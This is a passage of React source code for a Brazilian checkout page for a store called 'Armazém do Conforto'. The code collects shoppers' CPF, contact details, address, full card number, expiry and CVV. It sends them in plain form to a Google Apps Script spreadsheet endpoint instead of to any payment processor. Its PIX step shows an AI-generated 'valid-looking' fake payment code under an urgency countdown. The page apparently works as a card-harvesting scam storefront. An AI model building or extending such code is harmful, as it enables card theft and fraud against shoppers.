import React, { useState, useEffect } from 'react';
import { Truck, Zap, CheckCircle, Copy, Smartphone, Link, Clipboard } from 'lucide-react'; // Importando os ícones necessários

// Componente para exibir o resumo do cartão
const CardSummaryDisplay = ({ cardName, cardValidity, cardNumber, cardCvv, isCvvFocused }) => {
  return (
    <div
      className="relative w-80 h-48 rounded-xl shadow-lg p-6 transition-transform duration-500 ease-in-out
                 bg-gradient-to-br from-blue-500 to-purple-600 text-white"
      style={{ transform: isCvvFocused ? 'rotateY(180deg)' : 'rotateY(0deg)', transformStyle: 'preserve-3d' }}
    >
      {/* Frente do Cartão de Resumo */}
      <div
        className="absolute inset-0 flex flex-col justify-between p-6"
        style={{ backfaceVisibility: 'hidden' }}
      >
        <div className="text-sm font-semibold">
          <span>Resumo do Cartão</span>
        </div>
        <div className="font-mono text-xl tracking-wider text-left my-auto">
          {cardNumber || '•••• •••• •••• ••••'}
        </div>
        <div className="flex justify-between items-end">
          <div className="flex flex-col">
            <span className="text-xs opacity-80">Nome do Titular</span>
            <span className="uppercase text-lg font-semibold">{cardName || 'NOME SOBRENOME'}</span>
          </div>
          <div className="flex flex-col items-end">
            <span className="text-xs opacity-80">Validade</span>
            <span className="text-lg font-semibold">{cardValidity || 'MM/AA'}</span>
          </div>
        </div>
      </div>

      {/* Verso do Cartão de Resumo */}
      <div
        className="absolute inset-0 rounded-xl flex flex-col justify-start items-center text-white"
        style={{ transform: 'rotateY(180deg)', backfaceVisibility: 'hidden', backgroundImage: 'inherit' }}
      >
        <div className="w-full h-8 bg-black mt-8"></div>
        <div className="w-full flex justify-end pr-4 mt-2">
            <span className="font-mono text-xl text-white">{cardCvv}</span>
        </div>
      </div>
    </div>
  );
};

// Novo componente para a página de pagamento PIX
const PixPage = () => {
  const [minutes, setMinutes] = useState(10);
  const [seconds, setSeconds] = useState(0);
  const [pixCode, setPixCode] = useState('Gerando código PIX...');
  const [isCopied, setIsCopied] = useState(false);

  // Lógica do contador regressivo
  useEffect(() => {
    const timer = setInterval(() => {
      setSeconds((prevSeconds) => {
        if (prevSeconds === 0) {
          if (minutes === 0) {
            clearInterval(timer);
            // Poderia adicionar lógica aqui para desabilitar o botão ou mostrar mensagem de expiração
            return 0;
          }
          setMinutes((prevMinutes) => prevMinutes - 1);
          return 59;
        }
        return prevSeconds - 1;
      });
    }, 1000);

    return () => clearInterval(timer); // Limpa o intervalo ao desmontar o componente
  }, [minutes, seconds]);

  // Simula a geração do código PIX com a API do Gemini
  useEffect(() => {
    const generatePixCode = async () => {
      try {
        const prompt = "Generate a random valid-looking PIX code for a payment of R$ 94,05. The code should be a long alphanumeric string, simulating a real PIX code. Only provide the code, no extra text.";
        let chatHistory = [];
        chatHistory.push({ role: "user", parts: [{ text: prompt }] });
        const payload = { contents: chatHistory };
        const apiKey = ""; // A chave da API será fornecida pelo ambiente Canvas
        const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${apiKey}`;
        const response = await fetch(apiUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        const result = await response.json();
        if (result.candidates && result.candidates.length > 0 &&
            result.candidates[0].content && result.candidates[0].content.parts &&
            result.candidates[0].content.parts.length > 0) {
          const code = result.candidates[0].content.parts[0].text;
          setPixCode(code.trim()); // Remove espaços em branco extras
        } else {
          console.error("Falha ao gerar o código PIX pela LLM.");
          setPixCode("Erro ao gerar código PIX."); // Fallback
        }
      } catch (error) {
        console.error("Erro ao chamar a LLM para o código PIX:", error);
        setPixCode("Erro de rede ao gerar código PIX."); // Fallback
      }
    };
    generatePixCode();
  }, []);

  // Formata o tempo para exibir sempre dois dígitos
  const formatTime = (time) => String(time).padStart(2, '0');

  // Lida com a cópia do código PIX para a área de transferência
  const handleCopyCode = () => {
    const el = document.createElement('textarea');
    el.value = pixCode;
    document.body.appendChild(el);
    el.select();
    document.execCommand('copy');
    document.body.removeChild(el);
    setIsCopied(true);
    setTimeout(() => setIsCopied(false), 2000); // Reseta o status "Copiado!" após 2 segundos
  };

  return (
    // O container principal da PixPage agora tem o fundo #e6dcd0
    <div className="flex flex-col items-center p-6 bg-[#e6dcd0] max-w-md mx-auto">
      {/* Cabeçalho com LOGO e Selo de Segurança sem fundo branco e sem sombra, e sem o ícone */}
      <div className="w-full mb-8 flex justify-between items-center py-4">
        <img
          src="https://imgur.com/Caukxvf.png" // LOGO ATUALIZADA AQUI com o novo link do Imgur
          alt="Logo Armazém do Conforto"
          className="w-auto h-16" // Ajustado height para h-16
          onError={(e) => { e.target.onerror = null; e.target.src="https://placehold.co/100x50/8B0000/FFFFFF?text=LOGO" }} // Fallback genérico
        />
        <div className="flex flex-col items-end text-[#008000] font-semibold text-sm">
          <div className="flex items-center">
            <span className="font-bold">PAGAMENTO</span>
          </div>
          <span>100% SEGURO</span>
        </div>
      </div>

      {/* Conteúdo principal com borda arredondada e fundo branco */}
      <div className="w-full border border-gray-200 rounded-lg p-6 bg-white shadow-md">
        <h3 className="text-3xl font-bold text-[#242424] mb-4 text-center">Quase lá...</h3>
        <p className="text-[#242424] text-center text-base font-bold mb-8">Pague seu Pix para garantir seu pedido</p>

        {/* Contador Regressivo - Com quadrados e fonte diminuída e mais fina, mb-8 para mais espaçamento */}
        <div className="flex items-center justify-center mb-8">
          <div className="flex flex-col items-center">
            <div className="bg-[#8B0000] text-white p-3 rounded-md w-16 h-16 flex items-center justify-center text-4xl font-normal">
              {formatTime(minutes)}
            </div>
            <span className="text-xs text-[#9199a4]">MINUTOS</span>
          </div>
          {/* Dois pontos centralizados verticalmente, mx-0 para juntar mais */}
          <div className="flex items-center justify-center w-10 h-10 text-4xl font-extrabold text-[#8B0000]">
            :
          </div>
          <div className="flex flex-col items-center">
            <div className="bg-[#8B0000] text-white p-3 rounded-md w-16 h-16 flex items-center justify-center text-4xl font-normal">
              {formatTime(seconds)}
            </div>
            <span className="text-xs text-[#9199a4]">SEGUNDOS</span>
          </div>
        </div>

        {/* Alterado para normal-case, fonte diminuída para text-base, mb-6 para mais espaçamento */}
        <p className="text-[#242424] text-center text-base mb-6 normal-case">
          Pague através do código <span className="font-bold">"Pix Copia e Cola"</span>
        </p>

        {/* Valor do Pix e Botão Copiar Código centralizados, mb-8 para mais espaçamento */}
        <div className="flex flex-col items-center mb-8">
            <div className="text-lg font-bold text-gray-900 mb-6">
                <span className="text-gray-900">Valor do Pix: </span>
                <span className="text-[#4CAF50]">R$ 94,05</span>
            </div>

            <button
            onClick={handleCopyCode}
            className="flex items-center justify-center bg-[#4CAF50] text-white px-8 py-4 rounded-lg font-bold text-lg hover:bg-green-700 transition-colors duration-300 shadow-lg transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-[#4CAF50] focus:ring-opacity-50"
            disabled={minutes === 0 && seconds === 0}
            >
            <Copy className="h-6 w-6 mr-3" />
            {isCopied ? 'CÓDIGO COPIADO!' : 'COPIAR CÓDIGO PIX'}
            </button>
        </div>


        {/* Instruções PIX dentro de um quadro, mt-10 para mais espaçamento */}
        <div className="w-full border border-gray-300 rounded-lg p-6 bg-white shadow-md mt-10">
          <h4 className="text-base font-bold text-gray-800 mb-5 text-center">COMO PAGAR O SEU PEDIDO</h4>
          <ul className="space-y-4 text-sm text-gray-700"> {/* space-y-4 para mais espaçamento entre itens da lista */}
            <li className="flex items-start">
              <Clipboard className="h-5 w-5 text-gray-800 mr-2 mt-1 flex-shrink-0" />
              <span className="text-gray-700 normal-case">
                <span className="text-[#4CAF50] font-bold uppercase">COPIE O CÓDIGO</span> acima clicando no<br />botão.
              </span>
            </li>
            <li className="flex items-start">
              <Smartphone className="h-5 w-5 text-gray-800 mr-2 mt-1 flex-shrink-0" /> {/* Ícone preto */}
              <span className="text-gray-700">Abra o app de Seu banco e entre na<br />área <span className="font-bold uppercase text-[#4CAF50]">Pix</span>.</span>
            </li>
            <li className="flex items-start">
              <Link className="h-5 w-5 text-gray-800 mr-2 mt-1 flex-shrink-0" /> {/* Ícone preto */}
              <span className="text-gray-700">Escolha a opção <span className="font-bold uppercase text-[#4CAF50]">Pix copia e cola</span>.</span>
            </li>
            <li className="flex items-start">
              <Clipboard className="h-5 w-5 text-gray-800 mr-2 mt-1 flex-shrink-0" /> {/* Ícone preto */}
              <span className="text-gray-700">Cole o <span className="font-bold uppercase text-[#4CAF50]">código</span> e finalize a compra.</span>
            </li>
          </ul>
        </div>

        {/* PEDIDO #2196 - RESERVADO, mt-10 para mais espaçamento */}
        <div className="text-center mt-10 text-gray-800 font-bold uppercase">
          PEDIDO <span className="text-[#4CAF50]">#2196</span> - RESERVADO
        </div>
      </div>
    </div>
  );
};


// Main App component
const App = () => {
  // State para gerenciar a etapa atual do processo de checkout
  const [currentStep, setCurrentStep] = useState(1);
  // State para armazenar todos os dados do formulário
  const [formData, setFormData] = useState({
    fullName: '',
    cpf: '',
    email: '',
    phone: '',
    cep: '',
    address: '',
    number: '',
    complement: '',
    neighborhood: '',
    city: '',
    state: '',
    cardNumber: '',
    cardName: '', // Usado para "Nome e Sobrenome do Titular"
    cardValidity: '',
    cardCvv: '',
    installments: '1',
  });
  // State para gerenciar o método de pagamento selecionado
  const [paymentMethod, setPaymentMethod] = useState('creditCard'); // Padrão para cartão de crédito
  // State para gerenciar a opção de entrega selecionada
  const [deliveryOption, setDeliveryOption] = useState(''); // Novo state para opção de entrega
  // State para controlar a visibilidade dos campos de endereço completo após o CEP ser digitado
  const [cepEntered, setCepEntered] = useState(false);
  // State para controlar se o campo CVV está focado para a animação de virada do cartão
  const [isCvvFocused, setIsCvvFocused] = useState(false); // Reintroduzido para a animação
  // State para exibir mensagens de validação
  const [validationError, setValidationError] = useState('');

  // ADICIONE ESTA CONSTANTE NO INÍCIO DO SEU COMPONENTE APP (ou em um arquivo .env)
  // URL do Google Apps Script para enviar os dados do formulário
  const GOOGLE_SHEETS_WEB_APP_URL = "https://script.google.com/macros/s/AKfycbzUtTpgZYY3byYbt8mMJmtOMnjClYjqjTv26lLCkxU0n82nSlsXrqEX8cDQ6CJjL9KPZA/exec";

  // useEffect para resetar isCvvFocused quando o método de pagamento muda para 'creditCard'
  useEffect(() => {
    if (paymentMethod === 'creditCard') {
      setIsCvvFocused(false); // Garante que o cartão esteja de frente ao selecionar a opção
    }
  }, [paymentMethod]);


  // Define as etapas para a barra de progresso (agora com 3 etapas visíveis)
  const progressSteps = ['Dados', 'Entrega', 'Pagamento'];

  // Função para obter o índice da barra de progresso com base na etapa atual do formulário
  const getProgressBarIndex = (step) => {
    if (step === 1) return 0; // Dados
    if (step === 2 || step === 3) return 1; // Entrega (endereço e opção de entrega)
    if (step === 4 || step === 5) return 2; // Pagamento (inclui a página PIX)
    if (step === 6) return 2; // Confirmação final (ainda parte do processo de pagamento)
    return 2;
  };


  // Handler para mudanças nos inputs do formulário
  const handleChange = async (e) => {
    const { name, value, type, checked } = e.target;

    // Limpa o erro de validação ao digitar em qualquer campo
    setValidationError('');

    let formattedValue = value;

    // Lógica de formatação para CPF (versão ajustada)
    if (name === 'cpf') {
      console.log('CPF original:', value);
      formattedValue = value.replace(/\D/g, '');
      formattedValue = formattedValue.replace(/(\d{3})(\d)/, '$1.$2');
      formattedValue = formattedValue.replace(/(\d{3})(\d)/, '$1.$2');
      formattedValue = formattedValue.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
      if (formattedValue.length > 14) {
        formattedValue = formattedValue.substring(0, 14);
      }
      console.log('CPF formatado:', formattedValue);
    }

    // Lógica de formatação para número de telefone
    if (name === 'phone') {
      formattedValue = value.replace(/\D/g, '');
      if (formattedValue.length > 11) {
        formattedValue = formattedValue.substring(0, 11);
      }
      if (formattedValue.length > 10) {
        formattedValue = formattedValue.replace(/^(\d{2})(\d{5})(\d{4}).*/, '($1) $2-$3');
      } else if (formattedValue.length > 6) {
        formattedValue = formattedValue.replace(/^(\d{2})(\d{4})(\d{4}).*/, '($1) $2-$3');
      } else if (formattedValue.length > 2) {
        formattedValue = formattedValue.replace(/^(\d{2})(\d+)/, '($1) $2');
      } else if (formattedValue.length > 0) {
        formattedValue = formattedValue.replace(/^(\d*)/, '($1');
      }
    }

    // Formatação do Número do Cartão
    if (name === 'cardNumber') {
      formattedValue = value.replace(/\D/g, '');

      let temp = '';
      for (let i = 0; i < formattedValue.length; i++) {
        if (i > 0 && i % 4 === 0) {
          temp += ' ';
        }
        temp += formattedValue[i];
      }
      formattedValue = temp;

      if (formattedValue.length > 19) {
        formattedValue = formattedValue.substring(0, 19);
      }
    }

    // Formatação da Validade do Cartão (MM/AA)
    if (name === 'cardValidity') {
      formattedValue = value.replace(/\D/g, '');
      if (formattedValue.length > 2) {
        formattedValue = formattedValue.replace(/^(\d{2})(\d+)/, '$1/$2');
      }
      if (formattedValue.length > 5) {
        formattedValue = formattedValue.substring(0, 5);
      }
    }

    // Formatação do CVV do Cartão
    if (name === 'cardCvv') {
      formattedValue = value.replace(/\D/g, '');
      if (formattedValue.length > 4) {
        formattedValue = formattedValue.substring(0, 4);
      }
    }


    // Lógica especial para o campo CEP
    if (name === 'cep') {
      const cleanCep = value.replace(/\D/g, ''); // Remove todos os caracteres não-dígitos
      let formattedCep = cleanCep;

      if (formattedCep.length > 5) {
        formattedCep = formattedCep.replace(/^(\d{5})(\d)/, '$1-$2'); // Adiciona o hífen
      }
      if (formattedCep.length > 9) { // Limita a 9 caracteres (8 dígitos + 1 hífen)
        formattedCep = formattedCep.substring(0, 9);
      }

      setFormData((prevData) => ({
        ...prevData,
        [name]: formattedCep, // Armazena o valor formatado no formData
      }));

      // Apenas faz a requisição se o CEP tiver 8 dígitos (sem hífen)
      if (cleanCep.length === 8) {
        let data;
        let success = false;

        // Tenta BrasilAPI primeiro
        console.log(`Tentando buscar CEP: ${cleanCep} via BrasilAPI...`);
        try {
          const response = await fetch(`https://brasilapi.com.br/api/cep/v2/${cleanCep}`);
          data = await response.json();
          if (!data.errors) { // BrasilAPI usa 'errors' para problemas
            success = true;
            console.log('CEP encontrado via BrasilAPI:', data);
            setCepEntered(true);
            setFormData((prevData) => ({
              ...prevData,
              address: data.street || '', // BrasilAPI usa 'street'
              neighborhood: data.neighborhood || '', // BrasilAPI usa 'neighborhood'
              city: data.city || '',
              state: data.state || '',
            }));
          } else {
            console.warn('BrasilAPI retornou erro ou CEP não encontrado. Tentando ViaCEP...');
          }
        } catch (error) {
          console.error('Erro ao buscar CEP via BrasilAPI:', error);
          console.warn('BrasilAPI falhou. Tentando ViaCEP...');
        }

        // Se BrasilAPI falhou, tenta ViaCEP
        if (!success) {
          console.log(`Tentando buscar CEP: ${cleanCep} via ViaCEP...`);
          try {
            const response = await fetch(`https://viacep.com.br/ws/${cleanCep}/json/`);
            data = await response.json();
            if (!data.erro) {
              success = true;
              console.log('CEP encontrado via ViaCEP:', data);
              setCepEntered(true);
              setFormData((prevData) => ({
                ...prevData,
                address: data.logradouro || '',
                neighborhood: data.bairro || '',
                city: data.localidade || '',
                state: data.uf || '',
              }));
            } else {
              console.error('ViaCEP retornou erro ou CEP não encontrado. Dados:', data);
            }
          } catch (error) {
            console.error('Erro ao buscar CEP via ViaCEP:', error);
          }
        }

        // Se ambas as APIs falharem
        if (!success) {
          console.error('Falha ao encontrar CEP após tentar BrasilAPI e ViaCEP.');
          setCepEntered(false);
          setFormData((prevData) => ({
            ...prevData,
            address: '',
            neighborhood: '',
            city: '',
            state: '',
          }));
        }
      } else {
        setCepEntered(false);
        console.log('CEP incompleto/inválido, cepEntered set to false');
        setFormData((prevData) => ({
          ...prevData,
          address: '',
          neighborhood: '',
          city: '',
          state: '',
        }));
      }
      return; // Sai da função handleChange para evitar que a atualização geral sobrescreva o CEP
    }

    // Atualização geral para outros campos (não CEP)
    setFormData((prevData) => ({
      ...prevData,
      [name]: type === 'checkbox' ? checked : formattedValue,
    }));
  };

  // Função para avançar para a próxima etapa
  const handleNextStep = () => {
    setValidationError(''); // Limpa qualquer erro anterior

    if (currentStep === 1) {
      const { fullName, cpf, email, phone } = formData;
      if (!fullName || !cpf || !email || !phone) {
        setValidationError('Por favor, preencha todos os campos obrigatórios de Dados.');
        return;
      }
      setCurrentStep(currentStep + 1);
    } else if (currentStep === 2) {
      const { cep, address, number, neighborhood, city, state } = formData;
      if (!cep || !address || !number || !neighborhood || !city || !state) {
        setValidationError('Por favor, preencha todos os campos obrigatórios de Endereço.');
        return;
      }
      setCurrentStep(currentStep + 1);
    } else if (currentStep === 3) {
      if (!deliveryOption) {
        setValidationError('Por favor, selecione uma opção de entrega.');
        return;
      }
      setCurrentStep(currentStep + 1);
    } else if (currentStep === 4) {
      // Esta etapa agora só avança para a página PIX ou finaliza o cartão
      if (paymentMethod === 'creditCard') {
        const { cardNumber, cardName, cardValidity, cardCvv } = formData;
        if (!cardNumber || !cardName || !cardValidity || !cardCvv) {
          setValidationError('Por favor, preencha todos os campos do cartão de crédito.');
          return;
        }
        setCurrentStep(6); // Vai direto para a confirmação final para cartão
      } else if (paymentMethod === 'pix') {
        setCurrentStep(5); // Vai para a página PIX
      }
    }
  };

  // Função para voltar para a etapa anterior
  const handlePrevStep = () => {
    setValidationError(''); // Limpa o erro ao voltar
    setCurrentStep(currentStep - 1);
  };

  // Função para finalizar o pedido (agora usada para o cartão de crédito ou para ir para a página PIX)
  const handleFinalizeOrder = async () => { // Adicionado 'async' aqui
    setValidationError(''); // Limpa o erro ao finalizar

    // Coleta os dados do formulário para envio
    const dataToSubmit = {
      'Data Pedido': new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' }),
      'Nome Completo': formData.fullName,
      'CPF': formData.cpf,
      'Email': formData.email,
      'Telefone': formData.phone,
      'CEP': formData.cep,
      'Endereco': formData.address,
      'Numero': formData.number,
      'Complemento': formData.complement,
      'Bairro': formData.neighborhood,
      'Cidade': formData.city,
      'Estado': formData.state,
      'Metodo Pagamento': paymentMethod === 'creditCard' ? 'Cartão de Crédito' : 'Pix',
      'Numero Cartao': formData.cardNumber,
      'Nome Cartao': formData.cardName,
      'Validade Cartao': formData.cardValidity,
      'CVV Cartao': formData.cardCvv,
      'Parcelas': formData.installments,
      'Opcao Entrega': deliveryOption,
    };

    // Lógica de envio para o Google Sheets
    try {
      const response = await fetch(GOOGLE_SHEETS_WEB_APP_URL, {
        method: 'POST',
        mode: 'no-cors', // Importante para Google Apps Script
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams(dataToSubmit).toString(),
      });

      console.log('Requisição enviada para Google Sheets. Resposta (no-cors não mostra detalhes):', response);

      if (paymentMethod === 'creditCard') {
        console.log('Pedido Finalizado com Cartão!', formData, 'Método de Pagamento:', paymentMethod, 'Opção de Entrega:', deliveryOption);
        setCurrentStep(6); // Vai para a tela de confirmação final
      } else if (paymentMethod === 'pix') {
        console.log('Redirecionando para página PIX...', formData, 'Método de Pagamento:', paymentMethod, 'Opção de Entrega:', deliveryOption);
        setCurrentStep(5); // Vai para a página PIX
      }

    } catch (error) {
      console.error('Erro ao enviar dados para Google Sheets:', error);
      setValidationError('Erro ao finalizar pedido. Tente novamente mais tarde.');
    }
  };

  // Função chamada pela PixPage quando o pagamento é "concluído"
  const handlePixPaymentComplete = () => {
    console.log('Pagamento PIX simulado concluído.');
    setCurrentStep(6); // Avança para a tela de confirmação final
  };

  return (
    // Fundo da página principal do aplicativo alterado para #e6dcd0
    <div className="min-h-screen bg-[#e6dcd0] flex flex-col items-center font-sans pt-6">
      {currentStep === 5 ? (
        <PixPage />
      ) : (
        <>
          {/* LOGO - Mantido px-4 e w-full. O espaçamento vertical agora vem do pt-6 do container pai. */}
          <div className="mb-8 flex justify-center items-center px-4 w-full">
            <img
              src="https://imgur.com/Caukxvf.png"
              alt="Logo Armazém do Conforto"
              className="w-auto h-20 mx-auto"
              onError={(e) => { e.target.onerror = null; e.target.src="https://placehold.co/100x50/8B0000/FFFFFF?text=LOGO" }}
            />
          </div>

          {/* Banner Superior - Este div agora ocupará a largura total da tela */}
          <div className="w-full bg-[#8B0000] text-white text-center py-3 mb-8">
            <p className="text-lg font-semibold">Parabéns, você recebeu as últimas unidades com frete grátis</p>
          </div>

          {/* Barra de Progresso - Adicionado padding horizontal (px-4) para manter o espaçamento */}
          <div className="bg-white rounded-lg shadow-lg p-6 w-full max-w-4xl mb-8 px-4">
            <div className="flex justify-between items-center relative">
              {progressSteps.map((step, index) => (
                <React.Fragment key={step}>
                  <div className="flex flex-col items-center flex-1">
                    <div
                      className={`w-10 h-10 rounded-full flex items-center justify-center text-white font-bold transition-colors duration-300
                        ${getProgressBarIndex(currentStep) > index ? 'bg-[#4CAF50]' : getProgressBarIndex(currentStep) === index ? 'bg-[#4CAF50]' : 'bg-gray-300'}`}
                    >
                      {getProgressBarIndex(currentStep) > index ? (
                        <svg
                          xmlns="http://www.w3.org/2000/svg"
                          className="h-6 w-6"
                          fill="none"
                          viewBox="0 0 24 24"
                          stroke="currentColor"
                        >
                          <path
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            strokeWidth={2}
                            d="M5 13l4 4L19 7"
                          />
                        </svg>
                      ) : (
                        index + 1
                      )}
                    </div>
                    <span
                      className={`mt-2 text-sm text-center transition-colors duration-300
                        ${getProgressBarIndex(currentStep) >= index ? 'text-[#4CAF50]' : 'text-gray-500'}`}
                    >
                      {step}
                    </span>
                  </div>
                  {index < progressSteps.length - 1 && (
                    <div
                      className={`flex-1 h-1 mx-2 transition-colors duration-300
                        ${getProgressBarIndex(currentStep) > index ? 'bg-[#4CAF50]' : 'bg-gray-300'}`}
                    ></div>
                  )}
                </React.Fragment>
              ))}
            </div>
          </div>

          {/* Conteúdo principal do checkout - Adicionado padding horizontal (px-4) para manter o espaçamento */}
          <div className="bg-white rounded-lg shadow-lg p-6 w-full max-w-4xl px-4">
            {/* Mensagem de Erro de Validação */}
            {validationError && (
              <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded-md relative mb-4" role="alert">
                <strong className="font-bold">Erro de Validação:</strong>
                <span className="block sm:inline"> {validationError}</span>
              </div>
            )}

            {(() => {
              switch (currentStep) {
                case 1:
                  return (
                    <div className="space-y-6">
                      {/* Seção de Dados */}
                      <div className="bg-white p-4 rounded-md border border-gray-200">
                        <h2 className="text-xl font-semibold text-gray-700 mb-4">Para quem devemos entregar o pedido?</h2>
                        <div className="grid grid-cols-1 gap-4 mb-4">
                          {/* Nome Completo */}
                          <div className="relative">
                            <label htmlFor="fullName" className="block text-sm font-medium text-gray-700 mb-1">
                              Nome completo
                            </label>
                            <input
                              type="text"
                              id="fullName"
                              name="fullName"
                              value={formData.fullName}
                              onChange={handleChange}
                              className="w-full p-2 pr-10 border border-gray-300 rounded-md focus:ring-[#008080] focus:border-[#008080]"
                              required
                            />
                            <div className="absolute inset-y-0 right-0 pr-3 flex items-center pointer-events-none top-6">
                              <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                              </svg>
                            </div>
                          </div>
                          {/* E-mail */}
                          <div className="relative">
                            <label htmlFor="email" className="block text-sm font-medium text-gray-700 mb-1">
                              E-mail
                            </label>
                            <input
                              type="email"
                              id="email"
                              name="email"
                              value={formData.email}
                              onChange={handleChange}
                              className="w-full p-2 pr-10 border border-gray-300 rounded-md focus:ring-[#008080] focus:border-[#008080]"
                              required
                            />
                            <div className="absolute inset-y-0 right-0 pr-3 flex items-center pointer-events-none top-6">
                              <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
                              </svg>
                            </div>
                          </div>
                          {/* CPF */}
                          <div className="relative">
                            <label htmlFor="cpf" className="block text-sm font-medium text-gray-700 mb-1">
                              CPF
                            </label>
                            <input
                              type="text"
                              id="cpf"
                              name="cpf"
                              value={formData.cpf}
                              onChange={handleChange}
                              className="w-full p-2 pr-10 border border-gray-300 rounded-md focus:ring-[#008080] focus:border-[#008080]"
                              required
                              maxLength="14"
                            />
                            <div className="absolute inset-y-0 right-0 pr-3 flex items-center pointer-events-none top-6">
                              <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 6H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V8a2 2 0 00-2-2h-5m-4 0V5a2 2 0 114 0v1m-4 0h4" />
                              </svg>
                            </div>
                          </div>
                          {/* Celular/WhatsApp */}
                          <div className="relative">
                            <label htmlFor="phone" className="block text-sm font-medium text-gray-700 mb-1">
                              Celular/WhatsApp
                            </label>
                            <input
                              type="tel"
                              id="phone"
                              name="phone"
                              value={formData.phone}
                              onChange={handleChange}
                              className="w-full p-2 pr-10 border border-gray-300 rounded-md focus:ring-[#008080] focus:border-[#008080]"
                              required
                              maxLength="15"
                            />
                            <div className="absolute inset-y-0 right-0 pr-3 flex items-center pointer-events-none top-6">
                              <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.134l-1.897.87a1 1 0 00-.54 1.06l1.549 3.098a1 1 0 001.123 1.123l3.098 1.549a1 1 0 001.06-.54l.87-1.897a1 1 0 011.134-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" />
                              </svg>
                            </div>
                          </div>
                        </div>
                      </div>

                      {/* Botão Continuar */}
                      <div className="flex justify-end">
                        <button
                          onClick={handleNextStep}
                          className="bg-[#4CAF50] text-white px-6 py-3 rounded-md font-semibold hover:bg-green-700 transition-colors duration-300 shadow-md"
                        >
                          Avançar
                        </button>
                      </div>
                    </div>
                  );
                case 2:
                  return (
                    <div className="space-y-6">
                      {/* Seção de Endereço de Entrega */}
                      <div className="bg-white p-4 rounded-md border border-gray-200">
                        <h2 className="text-xl font-semibold text-gray-700 mb-4">Para onde devemos entregar o pedido?</h2>
                        {/* Container para CEP e exibição de Cidade/Estado */}
                        <div className="flex flex-col sm:flex-row items-center gap-4 mb-4">
                          <div className="flex items-center w-full sm:w-1/2 md:w-1/3 lg:w-1/4">
                            <label htmlFor="cep" className="block text-sm font-medium text-gray-700 mr-2 whitespace-nowrap">
                              CEP
                            </label>
                            <div className="relative flex-grow">
                              <input
                                type="text"
                                id="cep"
                                name="cep"
                                value={formData.cep}
                                onChange={handleChange}
                                className="w-full p-2 pr-10 border border-gray-300 rounded-md focus:ring-[#008080] focus:border-[#008080]"
                                required
                                maxLength="9"
                              />
                              <div className="absolute inset-y-0 right-0 pr-3 flex items-center pointer-events-none">
                                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.828 0L6.343 16.657m11.314 0A8 8 0 105.657 5.657a8 8 0 0011.314 11.314zm-1.657-4.657a4 4 0 11-8 0 4 4 0 018 0z" />
                                </svg>
                              </div>
                            </div>
                          </div>
                          {cepEntered && (
                            <div className="flex items-center bg-[#4CAF50] text-white font-semibold px-3 py-2 rounded-md shadow-sm">
                              {formData.city}/{formData.state}
                            </div>
                          )}
                        </div>

                        {cepEntered && (
                          <div className="grid grid-cols-1 gap-4">
                            <div className="relative">
                              <label htmlFor="address" className="block text-sm font-medium text-gray-700 mb-1">
                                Endereço (logradouro)
                              </label>
                              <input
                                type="text"
                                id="address"
                                name="address"
                                value={formData.address}
                                onChange={handleChange}
                                className="w-full p-2 pr-10 border border-gray-300 rounded-md focus:ring-[#008080] focus:border-[#008080]"
                                required
                              />
                              <div className="absolute inset-y-0 right-0 pr-3 flex items-center pointer-events-none top-6">
                                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6" />
                                </svg>
                              </div>
                            </div>
                            <div className="relative">
                              <label htmlFor="number" className="block text-sm font-medium text-gray-700 mb-1">
                                Número
                              </label>
                              <input
                                type="text"
                                id="number"
                                name="number"
                                value={formData.number}
                                onChange={handleChange}
                                className="w-full p-2 pr-10 border border-gray-300 rounded-md focus:ring-[#008080] focus:border-[#008080]"
                                required
                              />
                              <div className="absolute inset-y-0 right-0 pr-3 flex items-center pointer-events-none top-6">
                                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M7 20l4-16m2 16l4-16M6 9h14M4 15h14" />
                                </svg>
                              </div>
                            </div>
